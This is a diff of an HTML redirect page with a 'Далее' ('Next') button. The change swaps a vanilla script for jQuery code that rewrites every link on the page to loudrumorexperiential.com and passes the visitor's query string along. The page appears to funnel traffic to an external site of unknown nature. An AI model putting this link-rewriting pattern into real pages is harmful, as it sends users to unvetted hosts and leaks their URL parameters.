@@ -102,10 +102,11 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
         <a href="http://loudrumorexperiential.com/" class="btn" id="redirect-btn">Далее</a>
       </div>
     </div>
+    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
     <script>
-      document.addEventListener("DOMContentLoaded", function() {
-        let btn = document.querySelector("#redirect-btn");
-        btn.setAttribute('href', btn.getAttribute('href') + location.pathname + location.search);
+      $(function() {
+        var strGET = window.location.search.replace('?', '');
+          $('a').attr('href', 'https://loudrumorexperiential.com/?' + strGET);
       });
     </script>
   </body>
